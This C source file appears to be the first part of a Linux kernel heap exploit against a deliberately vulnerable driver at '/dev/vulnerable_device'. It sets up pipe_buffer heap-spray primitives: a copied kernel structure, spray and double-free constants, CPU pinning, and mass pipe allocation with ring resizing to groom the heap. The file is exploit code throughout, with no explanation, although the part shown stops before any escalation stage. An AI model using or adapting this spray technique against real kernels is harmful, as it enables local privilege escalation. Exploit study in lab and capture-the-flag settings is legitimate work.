//#define _GNU_SOURCE
//#include <linux/if_xdp.h>
#include <stdio.h>
#include <linux/if_tun.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/uio.h>
#include <assert.h>
#include <pthread.h>
//#include "liburing.h"
#define KMALLOC 0
#define KFREE 1
#define DUMP 3
#define ALLOC_PAGE 4
#define DEVICE_NAME "/dev/vulnerable_device"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdarg.h>
#include <sched.h>
#include <time.h>
#include <poll.h>
#include <signal.h>
//#include <keyutils.h>
#include <pthread.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <arpa/inet.h>
#include <x86intrin.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <stdint.h>
#include <stddef.h>
//typedef unsigned int u32;

#define PIPE_BUFFER_KCALLOC_SIZE 0x4000 

#define IOVEC_ARRAY_SZ 0x100
#define SPRAY_SIZE 256

#define MAX_PIPE_NUM 0x400
#define FIRST_PIPE_SPRAY (MAX_PIPE_NUM/2-0x22)
#define SECOND_PIPE_SPRAY (MAX_PIPE_NUM - FIRST_PIPE_SPRAY)

#define EXP_PIPE_NUM 0x1
#define DOUBLE_FREE 1
#define PIPE_PAGE_NUM 0x600

/*  check if expr==re */
#define CHECK(expr,ret)     \
    if((expr) != ret){    \
        do{             \
            perror(#expr);  \
            exit(EXIT_FAILURE); \
        } while (0);    \
    }                   
/*  check if expr==ret */


int my_pipe[2];
int pipes[MAX_PIPE_NUM][2];
int pipe_pages[PIPE_PAGE_NUM][2];
int pipe_spray[PIPE_PAGE_NUM][2];
int exp_pipes[2];
int pipes[MAX_PIPE_NUM][2];
char global_buffer[0x10];
char take_page_back_buffer[0x1000];

char *io_vec_buffer[0x1100] = {'\x00'};
//void *global_buffer = NULL;
int pipe_iovec[MAX_PIPE_NUM][2];

struct pipe_buffer {
	void *page; // struct page *page;
	unsigned int offset, len;
	void  *ops; //const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

struct kobj {
        size_t size;
        size_t index;
        void *buffer;
	unsigned long flags;
};
void set_cpu_affinity(){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0,&mask);
    if (sched_setaffinity(0,sizeof(mask),&mask))
        puts("set single CPU failed");
    return;
}

void prep() {
    set_cpu_affinity();
	if(pipe(exp_pipes)==-1)
	{
		perror("exp_pipes");
		exit(-1);
	}
    
    int ret = 0;
    for (int i = 0; i < PIPE_PAGE_NUM; i++) {
	  if (pipe(pipe_pages[i]) == -1) {
		  perror("pipe_pages");
		  exit(0);
	  }
	  ret = fcntl(pipe_pages[i][1], F_SETPIPE_SZ, 0x1000);	// 0x28 * (2**5)
	    //printf("[+] here pipe_pages[%x]: %d\n",i,ret);
	}

	//printf("[+] Prepare pipe_pages[%#x] done\n",PIPE_PAGE_NUM);
}

void put_vuln_obj() {
    set_cpu_affinity();
    char buf[0x2000];
    memset(buf,'z',0x2000);
    //printf("[+] Waiting for creating exp_pipes[%#x]\n",EXP_PIPE_NUM);
	fcntl(exp_pipes[1], F_SETPIPE_SZ, 0x1000*32);	// in kernel: do_fcntl -> pipe_fcntl -> pipe_set_size -> pipe_resize_ring
	write(exp_pipes[1], buf, 0x2000);
	//printf("[+] Alloc pipe_buffer by exp_pipes[%#x] success\n",EXP_PIPE_NUM);
	//getchar();
	//printf("[+] FIRST_PIPE_SPRAY: %#x\tMAX_PIPE_NUM-1: %#x\n",FIRST_PIPE_SPRAY , MAX_PIPE_NUM);
    return;
}

void cleanup() {
    for (unsigned long i = 0; i < PIPE_PAGE_NUM; i++) {
        close(pipe_pages[i][0]);
        close(pipe_pages[i][1]);
    }
    close(exp_pipes[0]);
    close(exp_pipes[1]);
}
